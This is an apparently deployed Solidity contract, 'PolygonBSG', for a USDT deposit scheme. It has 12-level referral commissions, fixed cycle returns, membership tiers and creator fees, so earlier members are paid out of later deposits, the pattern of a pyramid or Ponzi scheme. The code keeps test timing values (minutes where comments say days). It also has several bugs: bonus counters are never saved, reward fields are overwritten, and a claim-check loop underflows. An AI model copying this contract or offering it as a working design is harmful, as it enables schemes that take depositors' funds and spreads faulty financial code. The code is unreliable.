/**
 *Submitted for verification at polygonscan.com on 2022-11-08
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

contract PolygonBSG {
    using SafeMath for uint256;
    IERC20 public usdt;
    uint256 private constant baseDivider = 10000;
    uint256 private constant limitProfit = 20000;
    uint256 private constant feePercents = 200; //2%
    uint256 private constant minTransferAmount = 10e6; //$10
    uint256 private constant minDeposit = 100e6; //$100
    uint256 private constant maxDeposit = 2500e6; //$2500
    uint256 private constant freezeIncomePercents = 2000;
    uint256 private constant freezeIncomePercents1 = 3000;
    uint256 private constant LuckDeposit = 1000e6; //$1000
    uint256 private constant timeStep = 1 minutes; //1 days
    uint256 private constant dayPerCycle = 1 minutes; //15 days
    uint256 private constant normalcycleRewardPercents = 1500;
    uint256 private constant boostercycleRewardPercents = 2000;
    uint256 private constant maxdayPerCycle = 36 minutes; //50 days
    uint256 private constant referDepth = 12;

    uint256 private constant directPercents = 500;
    uint256[] private percent4Levels = [500,100,200,100,200,100,100,100,100,100,50,50,0]; //percent real value is current/baseDivider

    uint256 private constant infiniteRewardPercents = 400; //4%
    uint256 private constant insurancePoolPercents = 50; //0.5%
    uint256 private constant diamondIncomePoolPercents = 50; //0.5%
    uint256 private constant more1kIncomePoolPercents = 50; //0.5%

    uint256[5] private balDown = [5000, 7000, 11000];
    // uint256[5] private balDownRate = [1000, 1500, 2000, 5000, 6000]; 
    // uint256[5] private balRecover = [15e10, 50e10, 150e10, 500e10, 1000e10];
    mapping(uint256=>bool) public balStatus; // bal=>status

    address[2] public feeReceivers; //2 creator
    address public insuranceAccount; //0.5%

    address public defaultRefer; //set it as level 1
    uint256 public startTime;
    uint256 public lastDistribute; //daliy distribution pool reward
    uint256 public totalUser;
    uint256 public insurancePool;
    uint256 public diamondIncomePool;
    uint256 public more1kIncomePool;

    uint256 public AllTimeHigh;
    uint256 private constant ATHSTOPLOSS30 = 3000;
    uint256 private constant ATHSTOPLOSS50 = 5000;

    mapping(uint256=>address[]) public dayMore1kUsers;

    address[] public diamondUsers;
    address[] public blueDiamondUsers;
    address[] public crownDiamondUsers;

    struct OrderInfo {
        uint256 cycle;
        uint256 amount;
        uint256 start;
        uint256 unfreeze;
        bool isUnfreezed;
        bool isClaimed;
    }

    mapping(address => OrderInfo[]) public orderInfos;

    address[] public depositors;

    struct UserInfo {
        address referrer;
        uint256 start; //cycle start time
        uint256 level; // 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, -especially -1 with no sponser
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 teamNum;
        uint256 teamTotalDeposit;
        uint256 teamTotalVolume;
        uint256 totalFreezed;
        uint256 totalRevenue;
        uint256 membership; //normal, boost, diamond, blue diamond, crown diamond
        uint256 directBonusCount;
    }

    mapping(address => UserInfo) public userInfo;
    mapping(address => mapping(uint256 => address[])) public teamUsers;

    struct RewardInfo {
        uint256 capitals;
        uint256 statics;
        uint256 directs;
        uint256 levelReleased;
        uint256 infinityBonusReleased;
        uint256 cycleNumber; //start with 0
        uint256 cycleDepositAmount;
        uint256 splitAmount; //locked amount
        uint256 more1k;
        uint256 split;
        uint256 splitDebt; // locked amount got from other lock amount
    }

    mapping(address => RewardInfo) public rewardInfo;

    bool public isFreezeReward = false;
    bool public isStopLoss30ofATH = false;
    bool public isStopLoss50ofATH = false;

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositBySplit(address user, uint256 amount);
    event TransferBySplit(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);

    //for test
    event LevelChanged(address user, uint256 level);

    constructor(
        address _usdtAddr,
        address _defaultRefer,
        address _insurance,
        address[2] memory _feeReceivers
    ) public {
        usdt = IERC20(_usdtAddr);
        defaultRefer = _defaultRefer;
        insuranceAccount = _insurance;
        feeReceivers = _feeReceivers;
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
    }

    function register(address _referral) external {
        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer,"invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded");
        user.referrer = _referral;
        user.start = block.timestamp;
        user.level = 1; //
        _updateTeamNum(msg.sender);
        UserInfo storage uplineUser = userInfo[_referral];
        uplineUser.teamNum = uplineUser.teamNum.add(1);
        totalUser = totalUser.add(1);
        emit Register(msg.sender, _referral);
    }

    function _updateTeamNum(address _user) private {
        UserInfo storage user = userInfo[_user];
        _updateLevel(_user);
        address upline = user.referrer;
        for (uint256 i = 0; i < referDepth; i++) {
            if (upline != address(0)) {
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                if (upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            } else {
                break;
            }
        }
    }

    function _updateLevel(address _user) private {
        UserInfo storage user = userInfo[_user];
        user.level = _calLevelNow(_user);
        emit LevelChanged(_user, user.level);
    }

    function _calLevelNow(address _user) private view returns (uint256) {
        if (_user == defaultRefer) return 0;
        UserInfo storage user = userInfo[_user];
        uint256 levelNow = 1;
        address upline = user.referrer;
        for (uint256 i = 0; i < referDepth; i++) {
            UserInfo storage tmp_user = userInfo[upline];
            if (tmp_user.referrer == defaultRefer) {
                break;
            } else {
                upline = tmp_user.referrer;
                levelNow = levelNow + 1;
            }
        }
        return levelNow;
    }

    function deposit(uint256 amount) external {
        uint256 _amount = amount.mul(1000000);
        usdt.transferFrom(msg.sender, address(this), _amount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
    }

    function _deposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        require(user.referrer != address(0),"register first with referral address");
        require(_amount >= minDeposit, "should be more than min 100");
        require(_amount <= maxDeposit, "should be less than min 2500");
        require(_amount.mod(minDeposit) == 0,"amount should be multiple of 100");
        require(user.maxDeposit == 0 || _amount >= user.maxDeposit,"next deposit should be equal or more than previous");

        if (user.maxDeposit == 0) {
            user.maxDeposit = _amount;
        } else if (user.maxDeposit < _amount) {
            user.maxDeposit = _amount;
        }

        _distributeDeposit(_amount);

        if(user.totalDeposit == 0 && _amount >= LuckDeposit){
            uint256 dayNow = getCurDay();
            dayMore1kUsers[dayNow].push(_user);
        }

        depositors.push(_user);

        user.totalDeposit = user.totalDeposit.add(_amount);
        user.totalFreezed = user.totalFreezed.add(_amount);

        _updateMembership(_user);

        RewardInfo storage reward = rewardInfo[_user];
        uint256 addFreeze = 36;
        if(reward.cycleNumber >= 36){
            addFreeze = addFreeze.mul(timeStep);
        }else{
            addFreeze = reward.cycleNumber.mul(timeStep);
        }
        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        orderInfos[_user].push(OrderInfo(reward.cycleNumber,_amount, block.timestamp, unfreezeTime, false, false));
        reward.cycleNumber = reward.cycleNumber.add(1);

        _unfreezeFundAndUpdateReward(_user, _amount);

        distributePoolRewards();

        _updateReferInfo(_user, _amount);

        _updateReward(_user, _amount);

        _releaseUpRewards(_user, _amount);

        uint256 bal = usdt.balanceOf(address(this));
        _balActived(bal);
        if (isFreezeReward) {
            depositFromInsurance();
            _setFreezeReward(bal, true);
        }else{
            if(AllTimeHigh < bal)
                AllTimeHigh = bal;
        }
    }

    function _distributeDeposit(uint256 _amount) private {
        uint256 fee = _amount.mul(feePercents).div(baseDivider);
        usdt.transfer(feeReceivers[0], fee.div(2));
        usdt.transfer(feeReceivers[1], fee.div(2));
        uint256 _insurance = _amount.mul(insurancePoolPercents).div(baseDivider);
        usdt.transfer(insuranceAccount, _insurance);
        uint256 poolIncome = _amount.mul(diamondIncomePoolPercents).div(baseDivider);
        diamondIncomePool = diamondIncomePool.add(poolIncome);
        uint256 more1kPool = _amount.mul(more1kIncomePoolPercents).div(baseDivider);
        more1kIncomePool = more1kIncomePool.add(more1kPool);
    }

    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        bool isUnfreezeCapital;
        for (uint256 i = 0; i < orderInfos[_user].length; i++) {
            OrderInfo storage order = orderInfos[_user][i];
            if (block.timestamp > order.unfreeze && order.isUnfreezed == false && _amount >= order.amount) {
                order.isUnfreezed = true;
                isUnfreezeCapital = true;

                if (user.totalFreezed > order.amount) {
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                } else {
                    user.totalFreezed = 0;
                }

                _removeInvalidDeposit(_user, order.amount);

                uint256 staticReward;
                if (isStopLoss30ofATH || isStopLoss50ofATH) {
                    staticReward = 0;
                } else {
                    if(user.teamNum >= 2 && user.teamTotalDeposit >= order.amount.mul(limitProfit).div(baseDivider)){
                        staticReward = order.amount.mul(normalcycleRewardPercents).div(baseDivider);
                    }else{
                        staticReward = order.amount.mul(boostercycleRewardPercents).div(baseDivider);
                    }

                    if(user.totalRevenue > order.amount.mul(limitProfit).div(baseDivider)){
                        staticReward = 0;
                    }

                    rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);

                    rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);

                    user.totalRevenue = user.totalRevenue.add(staticReward);

                    break;
                }
            }
        }
    }

    function _removeInvalidDeposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        if (upline != address(0)) {
            if (userInfo[upline].teamTotalDeposit > _amount) {
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
            } else {
                userInfo[upline].teamTotalDeposit = 0;
            }
        }
    }

    function distributePoolRewards() public {
        if (block.timestamp > lastDistribute.add(timeStep)) {
            uint256 dayNow = block.timestamp;
            _distributeLuckPool1k(dayNow);
            lastDistribute = block.timestamp;
        }
    }

    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function _distributeLuckPool1k(uint256 _dayNow) private {
        uint256 day1kDepositCount = dayMore1kUsers[_dayNow - 1].length;
        if(day1kDepositCount > 0){
            for(uint256 i = day1kDepositCount; i > 0; i--){
                address userAddr = dayMore1kUsers[_dayNow - 1][i - 1];
                if(userAddr != address(0)){
                    uint256 reward = more1kIncomePool.div(day1kDepositCount);
                    rewardInfo[userAddr].more1k = rewardInfo[userAddr].more1k.add(reward);
                    userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(reward);
                }
            }
            more1kIncomePool = 0;
        }
    }

    function _updateReferInfo(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        if (upline != address(0)) {
            userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
            userInfo[upline].teamTotalVolume = userInfo[upline].teamTotalVolume.add(_amount);
            _updateMembership(upline);
        }
    }

    function _updateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        if (upline != address(0) && user.teamNum >= 2) {
            uint256 newAmount = _amount;
            if (upline != defaultRefer) {
                uint256 maxFreezing = getMaxFreezing(upline);
                if (maxFreezing < _amount) {
                    newAmount = maxFreezing;
                }
            }
            RewardInfo storage upRewards = rewardInfo[upline];
            uint256 reward = 0;
            if(user.directBonusCount < 10){
                reward = newAmount.mul(directPercents).div(baseDivider);
                user.directBonusCount.add(1);
            }else if(user.maxDeposit >= maxDeposit && user.directBonusCount < 20){
                reward = newAmount.mul(directPercents).div(baseDivider);
                user.directBonusCount.add(1);
            }
            upRewards.directs = upRewards.directs.add(reward);
            userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
        }
    }

    function getMaxFreezing(address _user) public view returns (uint256) {
        uint256 maxFreezing;
        for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze > block.timestamp){
                if(order.amount > maxFreezing){
                    maxFreezing = order.amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }

    function _releaseUpRewards(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        if (upline != address(0)) {
            uint256 newAmount = _amount;
            if (upline != defaultRefer) {
                uint256 maxFreezing = getMaxFreezing(upline);
                if (maxFreezing < _amount) {
                    newAmount = maxFreezing;
                }
            }

            RewardInfo storage upRewards = rewardInfo[upline];
            
            // by level reward
            uint256 levelReward = newAmount.mul(percent4Levels[user.level]).div(baseDivider);

            upRewards.levelReleased = upRewards.levelReleased.add(levelReward);
            userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(levelReward);
            
            //by membership reward
            if(userInfo[upline].membership == 2){
                //crown diamond reward
                if(userInfo[upline].level < 5){
                    upRewards.infinityBonusReleased = upRewards.capitals
                        .add(_amount.mul(infiniteRewardPercents).mul(1100)
                        .div(baseDivider).div(baseDivider));
                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue
                        .add(_amount.mul(infiniteRewardPercents).mul(1100)
                        .div(baseDivider).div(baseDivider));
                }
            }else if(userInfo[upline].membership == 3){
                //blue diamond reward
                upRewards.infinityBonusReleased = upRewards.capitals
                    .add(_amount.mul(infiniteRewardPercents).mul(1700)
                    .div(baseDivider).div(baseDivider));
                userInfo[upline].totalRevenue = userInfo[upline].totalRevenue
                    .add(_amount.mul(infiniteRewardPercents).mul(1700)
                    .div(baseDivider).div(baseDivider));
                upRewards.infinityBonusReleased = upRewards.capitals.sub(25e6);
                userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.sub(25e6);
                usdt.transfer(insuranceAccount, 25e6);
            }if(userInfo[upline].membership == 4){
                //diamond reward
                upRewards.infinityBonusReleased = upRewards.capitals.add(_amount.mul(infiniteRewardPercents).div(baseDivider));
                userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(_amount.mul(infiniteRewardPercents).div(baseDivider));
                upRewards.infinityBonusReleased = upRewards.capitals.sub(50e6);
                userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.sub(50e6);
                usdt.transfer(insuranceAccount, 50e6);
            }
        }
    }

    function _balActived(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(_bal >= AllTimeHigh.mul(balDown[i-1]).div(baseDivider)){
                balStatus[balDown[i - 1]] = true;
                break;
            }else{
                balStatus[balDown[i - 1]] = false;
            }
        }
    }

    function _setFreezeReward(uint256 _bal, bool when) private {
        if(when){ //deposit - only isFreezed = true
            for(uint256 i = balDown.length; i > 0; i--){
                if(balStatus[balDown[i - 1]]){
                    isFreezeReward = false;
                    break;
                }
            }
        }else{
            for(uint256 i = balDown.length; i > 0; i--){
                if(_bal < AllTimeHigh.mul(baseDivider.sub(ATHSTOPLOSS30)).div(baseDivider)){
                    isFreezeReward = true;
                    depositFromInsurance();
                    break;
                }
            }
        }
    }

    function withdraw() external {
        (bool _withdrawable, uint256 index) = _checkClaimable(msg.sender);
        require(_withdrawable == true, "Cant claim, Please check stake date and deposit status!");
        distributePoolRewards();
        (uint256 staticReward, uint256 staticSplit) = _calCurStaticRewards(msg.sender);
        uint256 splitAmt = staticSplit;
        uint256 withdrawable = staticReward;

        (uint256 dynamicReward, uint256 dynamicSplit) = _calCurDynamicRewards(msg.sender);
        withdrawable = withdrawable.add(dynamicReward);
        splitAmt = splitAmt.add(dynamicSplit);

        RewardInfo storage userRewards = rewardInfo[msg.sender];
        userRewards.split = userRewards.split.add(splitAmt);

        userRewards.statics = 0;

        userRewards.directs = 0;
        userRewards.levelReleased = 0;
        userRewards.infinityBonusReleased = 0;
        
        userRewards.more1k = 0;
        withdrawable = withdrawable.add(userRewards.capitals);
        userRewards.capitals = 0;
        
        usdt.transfer(msg.sender, withdrawable);
        uint256 bal = usdt.balanceOf(address(this));
        _setFreezeReward(bal, false);

        orderInfos[msg.sender][index].isClaimed = true;

        emit Withdraw(msg.sender, withdrawable);
    }

    function _calCurStaticRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        UserInfo storage user = userInfo[_user];
        uint256 totalRewards = userRewards.statics;
        uint256 splitAmt;
        if(user.membership == 0){
            splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        }else{
            splitAmt = totalRewards.mul(freezeIncomePercents1).div(baseDivider);
        }
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _calCurDynamicRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        UserInfo storage user = userInfo[_user];
        
        uint256 totalRewards = userRewards.directs.add(userRewards.levelReleased);
        totalRewards = totalRewards.add(userRewards.more1k);
        totalRewards = totalRewards.add(userRewards.infinityBonusReleased);

        uint256 splitAmt;
        if(user.membership == 0){
            splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        }else{
            splitAmt = totalRewards.mul(freezeIncomePercents1).div(baseDivider);
        }
        
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function depositBySplit(uint256 amount) external {
        uint256 _amount = amount.mul(1000000);
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        require(userInfo[msg.sender].totalDeposit == 0, "actived");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient split");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.sub(_amount.mul(30).div(100));
        _deposit(msg.sender, _amount);
        emit DepositBySplit(msg.sender, _amount);
    }

    function getCurSplit(address _user) public view returns(uint256){
        (, uint256 staticSplit) = _calCurStaticRewards(_user);
        (, uint256 dynamicSplit) = _calCurDynamicRewards(_user);
        return rewardInfo[_user].split.add(staticSplit).add(dynamicSplit).sub(rewardInfo[_user].splitDebt);
    }

    function transferBySplit(address _receiver, uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient income");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        rewardInfo[_receiver].split = rewardInfo[_receiver].split.add(_amount);
        emit TransferBySplit(msg.sender, _receiver, _amount);
    }

    function getDayMore1kLength(uint256 _day) external view returns(uint256) {
        return dayMore1kUsers[_day].length;
    }

    function getTeamUsersLength(address _user) external view returns(uint256) {
        UserInfo storage user = userInfo[_user];
        return user.teamNum;
    }

    function getTeamUsersLengthwithDepth(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }

    function getDepositorsLength() external view returns(uint256) {
        return depositors.length;
    }

    function getTeamDeposit(address _user) public view returns(uint256){
        UserInfo storage user = userInfo[_user];
        return user.teamTotalDeposit;
    }

    function _updateMembership(address _user) private {
        UserInfo storage user = userInfo[_user];
        if(user.teamNum >= 2 && user.teamTotalDeposit >= user.maxDeposit.mul(2)){
            if(user.maxDeposit >= 2500e6 && user.teamNum >= 15 && 
            user.teamTotalDeposit >= 15000e6 && user.teamTotalVolume >= 500000e6){
                user.membership = 4;
            }else if(user.maxDeposit >= 2500e6 && user.teamNum >= 10 && 
            user.teamTotalDeposit >= 10000e6 && user.teamTotalVolume >= 100000e6){
                user.membership = 3;
            }else if(user.maxDeposit >= 1000e6 && user.teamNum >= 5 && 
            user.teamTotalDeposit >= 10000e6 && user.teamTotalVolume >= 100000e6){
                user.membership = 2;
            }else{
                user.membership = 1;
            }
        }else{
            user.membership = 0;
        }
    }

    function _checkClaimable(address _user) public view returns(bool, uint256){
        OrderInfo[] storage orderlist = orderInfos[_user];
        uint256 i;
        for(i = orderlist.length - 1;i >= 0 ; i--){
            OrderInfo storage _order = orderlist[i];
            if(!_order.isClaimed && _order.cycle <= rewardInfo[_user].cycleNumber.sub(1) && block.timestamp >= _order.unfreeze){
                return (true,i);
            }
        }
        return (false,i);
    }

    function depositFromInsurance() private {
        usdt.transferFrom(insuranceAccount, address(this), usdt.allowance(insuranceAccount, address(this)));
    }
}